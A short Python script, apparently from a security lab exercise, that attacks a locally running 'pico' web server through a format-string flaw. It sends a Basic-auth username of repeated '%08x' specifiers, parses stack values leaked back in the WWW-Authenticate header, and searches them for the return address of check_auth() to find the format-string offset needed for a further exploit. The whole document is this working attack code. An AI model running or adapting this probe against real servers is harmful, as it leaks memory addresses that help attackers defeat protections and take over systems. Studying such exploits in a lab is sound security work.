import requests
from base64 import b64encode

# actual return address of check_auth() when running pico server locally (changes each time)
actual_addr = 0x565560c2

for i in range(31, 32):

    username = "%08x "*i

    with requests.session() as session:

        url = "http://localhost:12345"

        password = ""

        userAndPass = b64encode(bytes(username + ':' + password, "utf-8")).decode("ascii")

        headers = {	'Connection':'close', "Accept-Encoding": "deflate, gzip", "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/91.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", 
                    "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive", "Content-Length": "150", 
                    "Upgrade-Insecure-Requests": "1","Authorization": "Basic %s" % userAndPass }

        data = b'A' * 1

        # get stack data
        res = session.post(url, headers=headers, data=data)
        stack_data = res.headers['WWW-Authenticate'].replace('Basic realm="Invalid user: ','').replace('"','').split(' ')

        for number in stack_data:
            try:
                number_dec = int(str(number), 16)
                if abs(number_dec - actual_addr) == 0:
                    print("You should use", i, "%x")
                    break
            except:
                pass

        session.close()